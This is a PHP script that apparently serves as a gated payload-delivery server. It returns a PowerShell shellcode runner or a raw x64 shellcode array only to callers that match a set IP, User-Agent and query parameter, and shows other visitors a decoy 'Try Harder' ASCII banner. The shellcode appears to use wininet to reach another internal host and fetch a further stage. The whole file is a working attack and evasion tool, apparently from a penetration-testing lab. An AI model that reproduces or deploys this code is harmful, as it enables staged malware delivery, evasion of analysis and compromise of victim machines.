<?php
function callerIp($caller) {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    if ($caller === $ip) {
        return TRUE;
    } else {
        return FALSE;
    }
}

function callerAgent($caller) {
    $agent = $_SERVER['HTTP_USER_AGENT'];
    if ($caller === $agent) {
        return TRUE;
    } else {
        return FALSE;
    }
}

function callerParam($caller) {
    $param = isset($_GET[$caller]);
    if ($param) {
        return TRUE;
    } else {
        return FALSE;
    }
}

function decoy() {
    $decoy = 'Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLi4jIy4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLi4uIyMuLi4uLi4uLi4uLg0KLi4uLi4uLiMjLi4uLi4jIy4uLi4jIy4uLi4uLi4uLi4uLi4uDQouLi4uLi4uIyMuLi4uLiMjLi4uLiMjLi4uLi4uLi4uLi4uLi4NCi4uLi4uLi4uLiMjLi4uLi4jIy4uLiMjLi4uLi4uLi4uLi4uLg0KLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uDQouLi4uLi4jIyMjIyMjIyMjIyMjIyMjIyMjIy4uLi4uLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uIyMuLi5UcnkuSGFyZGVyLi4uIyMuLiMjLi4uLi4uDQouLi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4jIy4uIyMuLi4uLi4NCi4uLi4uLiMjLi4uLi4uLi4uLi4uLi4uLiMjIyMjIy4uLi4uLg0KLi4uLi4uLi4jIy4uLi4uLi4uLi4uLiMjLi4uLi4uLi4uLi4uDQouLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjLi4uLi4uLi4NCi4uLi4jIy4uLi4uLi4uLi4uLi4uLi4uLi4uIyMuLi4uLi4uLg0KLi4uLi4uIyMjIyMjIyMjIyMjIyMjIyMjIyMuLi4uLi4uLi4uDQouLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4=';
    $agent = $_SERVER['HTTP_USER_AGENT'];
    if(preg_match('((?i)(curl|wget|powershell))', $agent) === 1) {
        echo base64_decode($decoy);
    } else {
        echo '<pre>' . base64_decode($decoy) . '</pre>';
    }
}

function payload_shellcode() {
    $payload = '0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x0,0x0,0x0,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x51,0x56,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0xf,0xb7,0x4a,0x4a,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x1,0xd0,0x66,0x81,0x78,0x18,0xb,0x2,0xf,0x85,0x72,0x0,0x0,0x0,0x8b,0x80,0x88,0x0,0x0,0x0,0x48,0x85,0xc0,0x74,0x67,0x48,0x1,0xd0,0x8b,0x48,0x18,0x50,0x44,0x8b,0x40,0x20,0x49,0x1,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x4d,0x31,0xc9,0x48,0x1,0xd6,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0xd,0x41,0x1,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x3,0x4c,0x24,0x8,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x1,0xd0,0x66,0x41,0x8b,0xc,0x48,0x44,0x8b,0x40,0x1c,0x49,0x1,0xd0,0x41,0x8b,0x4,0x88,0x48,0x1,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,0x6e,0x65,0x74,0x0,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,0x7,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0xd,0x0,0x0,0x0,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x30,0x2e,0x32,0x31,0x0,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x1,0x0,0x0,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x3,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x0,0x0,0x0,0x0,0xff,0xd5,0xe8,0x1f,0x0,0x0,0x0,0x2f,0x57,0x30,0x37,0x34,0x69,0x4e,0x45,0x31,0x70,0x48,0x56,0x69,0x75,0x57,0x4f,0x37,0x41,0x62,0x63,0x6e,0x34,0x51,0x75,0x77,0x69,0x34,0x52,0x49,0x57,0x0,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x0,0x32,0xa8,0x84,0x0,0x0,0x0,0x0,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0xa,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x0,0x0,0x49,0x89,0xe0,0x6a,0x4,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x0,0x0,0x0,0x0,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x6,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x0,0x0,0x49,0xba,0x44,0xf0,0x35,0xe0,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0xff,0xcf,0x74,0x2,0xeb,0xaa,0xe8,0x55,0x0,0x0,0x0,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x0,0x10,0x0,0x0,0x49,0xba,0x58,0xa4,0x53,0xe5,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x0,0x20,0x0,0x0,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x0,0x0,0x0,0x0,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x7,0x48,0x1,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x0,0x59,0xbb,0xe0,0x1d,0x2a,0xa,0x41,0x89,0xda,0xff,0xd5';
    echo $payload;
}

function payload_runner(){
    $payload = file_get_contents('/home/kali/payloads/shellcode-runner.ps1');
    echo $payload;
}

$ip = callerIp('192.168.0.29');
$agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.01) Gecko/20100101 Firefox/102.01');
$param = callerParam('session');

if ($ip && $agent && $param) {
    payload_runner();
} else {
    $ip = callerIp('192.168.0.29');
    $agent = callerAgent('Mozilla/5.0 (X11; Linux x86_64; rv:102.00) Gecko/20100101 Firefox/102.00');
    $param = callerParam('handler');
    if ($ip && $agent && $param) {
        payload_shellcode();
    } else {
        decoy();
    }
}
?>
